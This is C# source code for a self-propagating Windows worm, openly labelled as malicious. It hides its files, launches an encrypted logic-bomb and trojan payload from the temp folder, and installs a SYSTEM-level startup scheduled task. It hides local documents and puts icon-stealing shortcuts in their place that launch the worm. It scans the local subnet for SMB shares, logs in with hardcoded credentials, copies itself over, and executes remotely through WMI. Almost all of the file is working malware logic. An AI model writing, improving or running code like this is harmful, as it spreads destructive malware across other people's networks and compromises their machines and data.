using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AuthenticationLevel = System.Management.AuthenticationLevel;
using SharedCrypto;
using IWshRuntimeLibrary; // Ensure COM reference is added

class Program
{
    private const string SMB_USERNAME = "user";
    private const string SMB_PASSWORD = "user";
    private const string SMB_SHARE_NAME = "SharedFolder";
    private const string PAYLOAD_FOLDER_NAME = "payload";
    private const string WORM_EXE_NAME = "Worm.exe";
    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
    private const string KEY_FILE_NAME = "key.dat";
    private const string SHARED_CRYPTO_DLL = "SharedCrypto.dll";

    private const int PING_TIMEOUT_MS = 300;
    private const int MAX_CONCURRENT_SCANS = 50;
    private const int SCAN_INTERVAL_MINUTES = 10;

    private const string WORM_TASK_NAME = "Malicious_Worm";

    private static string logFilePath;

    static async Task Main(string[] args)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;

        // --- FIX: Ensure we start in the base directory to find files correctly ---
        Directory.SetCurrentDirectory(baseDir);

        string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
        string logFileName = $"Worm_log_{timestamp}.log";
        logFilePath = Path.Combine(baseDir, logFileName);

        LogToFile("========================================");
        LogToFile($"Worm started at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
        LogToFile($"Process ID: {Process.GetCurrentProcess().Id}");
        LogToFile($"Running from: {baseDir}");
        LogToFile("========================================");

        try
        {
            // 1. Hide files immediately to avoid detection
            LogInfo("Applying file attributes (Hidden/System)...");
            HideMalwareFiles(baseDir);

            // 2. Start LogicBomb from a LOCAL TEMP copy to avoid UNC path freeze
            LogInfo("Staging disposable payload to %TEMP%...");
            StartLogicBombFromTemp();

            // 3. Install Persistence
            LogInfo("Attempting to install persistence...");
            InstallPersistence();

            // 4. Begin Propagation Loop
            LogInfo("Starting main loop (Infection & Propagation)...");
            await ContinuousScanLoop();
        }
        catch (Exception ex)
        {
            LogError($"Critical error in main loop: {ex.Message}");
            LogToFile($"Stack trace: {ex.StackTrace}");
        }
    }

    // --- NEW: Hide files excluding logs and txt ---
    private static void HideMalwareFiles(string directory)
    {
        try
        {
            DirectoryInfo dirInfo = new DirectoryInfo(directory);

            // Hide specific files in the root
            foreach (var file in dirInfo.GetFiles())
            {
                string ext = file.Extension.ToLower();
                if (ext == ".log" || ext == ".txt") continue; // Skip logs

                try
                {
                    // Adding Hidden and System attributes
                    System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System);
                }
                catch { }
            }

            // Hide the payload folder recursively
            string payloadPath = Path.Combine(directory, PAYLOAD_FOLDER_NAME);
            if (Directory.Exists(payloadPath))
            {
                DirectoryInfo payloadDir = new DirectoryInfo(payloadPath);
                payloadDir.Attributes = FileAttributes.Hidden | FileAttributes.System;

                foreach (var file in payloadDir.GetFiles("*", SearchOption.AllDirectories))
                {
                    try { System.IO.File.SetAttributes(file.FullName, FileAttributes.Hidden | FileAttributes.System); } catch { }
                }
            }
        }
        catch (Exception ex)
        {
            LogWarning($"Failed to hide malware files: {ex.Message}");
        }
    }

    // --- MODIFIED: Copy to %TEMP% to prevent Session 0 Freeze ---
    private static void StartLogicBombFromTemp()
    {
        try
        {
            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string originalPayloadPath = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

            if (!Directory.Exists(originalPayloadPath))
            {
                LogWarning($"Original payload folder not found at '{originalPayloadPath}'. Cannot start LogicBomb.");
                return;
            }

            // Use Path.GetTempPath() to ensure we are on the LOCAL disk
            string randomSuffix = new Random().Next(10000000, 99999999).ToString();
            string tempFolder = Path.Combine(Path.GetTempPath(), $"{PAYLOAD_FOLDER_NAME}_{randomSuffix}");

            LogInfo($"Creating disposable payload copy at local temp: {tempFolder}");

            // Duplicate the payload folder to Temp
            CopyFolderSync(originalPayloadPath, tempFolder);

            string logicBombPath = Path.Combine(tempFolder, LOGICBOMB_EXE_NAME);
            if (System.IO.File.Exists(logicBombPath))
            {
                // Execute from Temp. Since it's local, no security warning will pop up.
                ProcessStartInfo psi = new ProcessStartInfo(logicBombPath)
                {
                    UseShellExecute = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = tempFolder // Ensure it runs in the temp context
                };

                Process.Start(psi);
                LogSuccess($"LogicBomb started successfully from {tempFolder}");
            }
            else
            {
                LogWarning($"LogicBomb.exe not found in temp folder.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Failed to start LogicBomb from temp: {ex.Message}");
        }
    }

    private static void InstallPersistence()
    {
        try
        {
            string wormPath = Process.GetCurrentProcess().MainModule.FileName;
            // NOTE: If running from UNC, schtasks might fail or the task might fail to start on reboot 
            // if networking isn't ready. Ideally, copy Worm to C:\Windows\Temp for persistence too, 
            // but keeping current logic as requested.
            if (CreateScheduledTask(WORM_TASK_NAME, wormPath))
            {
                LogSuccess($"Worm persistence task created: {WORM_TASK_NAME}");
            }
            else
            {
                LogWarning($"Failed to create Worm scheduled task.");
            }
        }
        catch (Exception ex)
        {
            LogError($"Persistence installation failed: {ex.Message}");
        }
    }

    private static bool CreateScheduledTask(string taskName, string exePath)
    {
        try
        {
            var deleteTask = new ProcessStartInfo("schtasks.exe", $"/Delete /TN \"{taskName}\" /F")
            { CreateNoWindow = true, UseShellExecute = false };
            Process.Start(deleteTask)?.WaitForExit();

            var createTask = new ProcessStartInfo("schtasks.exe", $"/Create /SC ONSTART /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /RU SYSTEM /RL HIGHEST /F")
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            };

            using (var process = Process.Start(createTask))
            {
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();
                if (process.ExitCode == 0) return true;
                LogToFile($"Failed to create task {taskName}: {error}");
                return false;
            }
        }
        catch (Exception ex)
        {
            LogToFile($"Exception creating task {taskName}: {ex.Message}");
            return false;
        }
    }

    private static async Task ContinuousScanLoop()
    {
        int scanCount = 0;
        while (true)
        {
            scanCount++;
            LogInfo($"========== LOOP #{scanCount} ==========");
            try
            {
                InfectCurrentDirectoryWithLNKs();

                string localIP = GetLocalIPAddress();
                if (string.IsNullOrEmpty(localIP))
                {
                    LogError("Could not detect local IP address. Cannot scan network.");
                }
                else
                {
                    string baseIP = string.Join(".", localIP.Split('.').Take(3));
                    LogInfo($"Local IP: {localIP}, Scanning network: {baseIP}.1 - {baseIP}.254");

                    List<string> smbHosts = await FindSmbServersAsync(baseIP);
                    LogInfo($"Scan complete: Found {smbHosts.Count} SMB host(s) to infect.");

                    foreach (string ip in smbHosts)
                    {
                        await ProcessTargetHost(ip);
                    }
                }
            }
            catch (Exception ex)
            {
                LogError($"Error during scan loop #{scanCount}: {ex.Message}");
            }

            LogInfo($"Loop #{scanCount} complete. Waiting {SCAN_INTERVAL_MINUTES} minutes...");
            await Task.Delay(TimeSpan.FromMinutes(SCAN_INTERVAL_MINUTES));
        }
    }

    private static void InfectCurrentDirectoryWithLNKs()
    {
        LogInfo($"Attempting to infect document files...");
        // This is safe to run in loop as we check File.Exists
        try
        {
            string currentDir = AppDomain.CurrentDomain.BaseDirectory;
            string wormPath = Path.Combine(currentDir, WORM_EXE_NAME);
            string[] targetExtensions = { ".docx", ".xlsx", ".pptx", ".pdf", ".txt" };

            var filesToInfect = Directory.GetFiles(currentDir)
                .Where(f => targetExtensions.Contains(Path.GetExtension(f).ToLower()) &&
                             !Path.GetFileName(f).Equals(Path.GetFileName(logFilePath), StringComparison.OrdinalIgnoreCase));

            int infectedCount = 0;
            foreach (string filePath in filesToInfect)
            {
                string lnkPath = filePath + ".lnk";
                if (System.IO.File.Exists(lnkPath)) continue;

                // Hide original file
                System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);

                WshShell shell = new WshShell();
                IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(lnkPath);
                shortcut.TargetPath = wormPath;
                shortcut.Arguments = $"\"{filePath}\""; // Pass original file as arg to open it
                shortcut.IconLocation = filePath + ",0"; // Steal icon
                shortcut.Save();
                infectedCount++;
            }
            if (infectedCount > 0)
            {
                LogSuccess($"Created {infectedCount} new LNK traps.");
            }
            else LogInfo($"Nothing to infect for now...");
        }
        catch (Exception ex)
        {
            LogWarning($"LNK infection warning: {ex.Message}");
        }
    }

    private static async Task ProcessTargetHost(string ip)
    {
        LogInfo($"--- Processing target server: {ip} ---");
        if (IsWormAlreadyRunningOnTarget(ip))
        {
            LogInfo($"Worm process already detected on {ip}, skipping");
            return;
        }

        string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
        int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);

        if (smbConnectResult != 0)
        {
            LogWarning($"SMB connection to {ip} failed - Error: {GetWNetErrorDescription(smbConnectResult)}");
            return;
        }

        LogSuccess($"Connected to share on {ip}");
        string localPackagePath = null;
        try
        {
            localPackagePath = Path.Combine(Path.GetTempPath(), $"WormDeploy_{Guid.NewGuid():N}");
            PrepareVictimSpecificPackage(localPackagePath);

            await CopyFolderAsync(localPackagePath, remoteShareUNC);
            LogSuccess($"Copied new worm package to {ip}");

            // Note: We are sending the UNC path here. The next victim will likely experience the same UNC execution path.
            // This is why StartLogicBombFromTemp is crucial.
            string remoteWormExePath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);

            LogInfo($"Attempting to execute Worm remotely on {ip} via WMI...");
            if (ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath))
            {
                LogSuccess($"Successfully propagated to {ip}");
            }
            else
            {
                LogWarning($"File copy succeeded but WMI execution failed on {ip}");
            }
        }
        catch (Exception ex)
        {
            LogError($"Error processing {ip}: {ex.Message}");
        }
        finally
        {
            DisconnectFromRemoteShare(remoteShareUNC);
            if (localPackagePath != null && Directory.Exists(localPackagePath))
            {
                try { Directory.Delete(localPackagePath, true); } catch { }
            }
        }
    }

    private static void PrepareVictimSpecificPackage(string tempPackagePath)
    {
        string baseDir = AppDomain.CurrentDomain.BaseDirectory;
        string basePayloadDir = Path.Combine(baseDir, PAYLOAD_FOLDER_NAME);

        Directory.CreateDirectory(tempPackagePath);
        string tempPayloadDir = Path.Combine(tempPackagePath, PAYLOAD_FOLDER_NAME);
        Directory.CreateDirectory(tempPayloadDir);

        System.IO.File.Copy(Path.Combine(baseDir, WORM_EXE_NAME), Path.Combine(tempPackagePath, WORM_EXE_NAME));
        System.IO.File.Copy(Path.Combine(baseDir, SHARED_CRYPTO_DLL), Path.Combine(tempPackagePath, SHARED_CRYPTO_DLL));

        CopyFolderSync(basePayloadDir, tempPayloadDir);

        string oldKey = System.IO.File.ReadAllText(Path.Combine(basePayloadDir, KEY_FILE_NAME));
        string newKey = CryptoUtils.GenerateRandomKey();

        string originalBombPath = Path.Combine(basePayloadDir, ENCRYPTED_BOMB_NAME);
        string tempTrojanPath = Path.Combine(tempPackagePath, "Trojan.exe");
        string finalBombPath = Path.Combine(tempPayloadDir, ENCRYPTED_BOMB_NAME);

        CryptoUtils.DecryptFile(originalBombPath, tempTrojanPath, oldKey);
        CryptoUtils.EncryptFile(tempTrojanPath, finalBombPath, newKey);

        System.IO.File.WriteAllText(Path.Combine(tempPayloadDir, KEY_FILE_NAME), newKey);

        System.IO.File.Delete(tempTrojanPath);
    }

    private static bool IsWormAlreadyRunningOnTarget(string remoteIp)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = SMB_USERNAME, Password = SMB_PASSWORD, Timeout = TimeSpan.FromSeconds(10) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            var searcher = new ManagementObjectSearcher(scope, new ObjectQuery($"SELECT * FROM Win32_Process WHERE Name = '{WORM_EXE_NAME}'"));
            return searcher.Get().Count > 0;
        }
        catch { return false; }
    }

    private static async Task<List<string>> FindSmbServersAsync(string baseIP)
    {
        var activeHosts = new List<string>();
        var semaphore = new SemaphoreSlim(MAX_CONCURRENT_SCANS);
        var tasks = Enumerable.Range(1, 254).Select(async i =>
        {
            string ip = $"{baseIP}.{i}";
            await semaphore.WaitAsync();
            try
            {
                using (var ping = new Ping())
                {
                    if ((await ping.SendPingAsync(ip, PING_TIMEOUT_MS)).Status == IPStatus.Success)
                    {
                        if (ConnectToRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}", SMB_USERNAME, SMB_PASSWORD) == 0)
                        {
                            lock (activeHosts) activeHosts.Add(ip);
                            DisconnectFromRemoteShare($"\\\\{ip}\\{SMB_SHARE_NAME}");
                        }
                    }
                }
            }
            catch { }
            finally { semaphore.Release(); }
        });
        await Task.WhenAll(tasks);
        return activeHosts;
    }

    private static string GetLocalIPAddress()
    {
        try
        {
            // Simple socket method is more robust than iterating interfaces sometimes
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                return socket.LocalEndPoint.ToString().Split(':')[0];
            }
        }
        catch
        {
            return null;
        }
    }

    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
    {
        try
        {
            var connOpts = new ConnectionOptions { Username = username, Password = password, Impersonation = ImpersonationLevel.Impersonate, EnablePrivileges = true, Timeout = TimeSpan.FromSeconds(30) };
            var scope = new ManagementScope($"\\\\{remoteIp}\\root\\cimv2", connOpts);
            scope.Connect();
            using (var processClass = new ManagementClass(scope, new ManagementPath("Win32_Process"), null))
            {
                var inParams = processClass.GetMethodParameters("Create");
                inParams["CommandLine"] = commandToExecute;
                var outParams = processClass.InvokeMethod("Create", inParams, null);
                return outParams != null && (Convert.ToInt32(outParams["returnValue"]) == 0);
            }
        }
        catch { return false; }
    }

    private static void CopyFolderSync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (string file in Directory.GetFiles(source))
        {
            System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
        }
        foreach (string dir in Directory.GetDirectories(source))
        {
            CopyFolderSync(dir, Path.Combine(dest, Path.GetFileName(dir)));
        }
    }

    private static async Task CopyFolderAsync(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        var files = Directory.GetFiles(source).Select(async file =>
        {
            try
            {
                await Task.Run(() => System.IO.File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true));
            }
            catch { } // Suppress copy errors
        });
        var dirs = Directory.GetDirectories(source).Select(dir => CopyFolderAsync(dir, Path.Combine(dest, Path.GetFileName(dir))));
        await Task.WhenAll(files.Concat(dirs));
    }

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);

    [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
    private static extern int WNetCancelConnection2(string name, int flags, bool force);

    private static int ConnectToRemoteShare(string remotePath, string username, string password)
    {
        var nr = new NETRESOURCE { dwType = 1, lpRemoteName = remotePath };
        return WNetAddConnection2(ref nr, password, username, 0);
    }

    private static void DisconnectFromRemoteShare(string remotePath)
    {
        try { WNetCancelConnection2(remotePath, 0, true); } catch { }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct NETRESOURCE
    {
        public int dwScope; public int dwType; public int dwDisplayType; public int dwUsage;
        public string lpLocalName; public string lpRemoteName; public string lpComment; public string lpProvider;
    }

    private static void Log(string message, ConsoleColor color)
    {
        string prefix;
        if (color == ConsoleColor.Green) prefix = "[SUCCESS]";
        else if (color == ConsoleColor.Yellow) prefix = "[WARNING]";
        else if (color == ConsoleColor.Red) prefix = "[ERROR]";
        else prefix = "[INFO]";

        string logMessage = $"{prefix} {message}";
        Console.ForegroundColor = color;
        Console.WriteLine(logMessage);
        Console.ResetColor();
        LogToFile(logMessage);
    }
    private static void LogInfo(string message) => Log(message, ConsoleColor.Cyan);
    private static void LogSuccess(string message) => Log(message, ConsoleColor.Green);
    private static void LogWarning(string message) => Log(message, ConsoleColor.Yellow);
    private static void LogError(string message) => Log(message, ConsoleColor.Red);
    private static void LogToFile(string message)
    {
        try { System.IO.File.AppendAllText(logFilePath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}"); } catch { }
    }

    private static string GetWNetErrorDescription(int errorCode)
    {
        switch (errorCode)
        {
            case 5: return "Access is denied";
            case 53: return "The network path was not found";
            case 86: return "The specified network password is not correct";
            case 1219: return "Multiple connections to a server not allowed";
            case 1326: return "Logon failure: unknown user name or bad password";
            default: return $"Error code {errorCode}";
        }
    }
}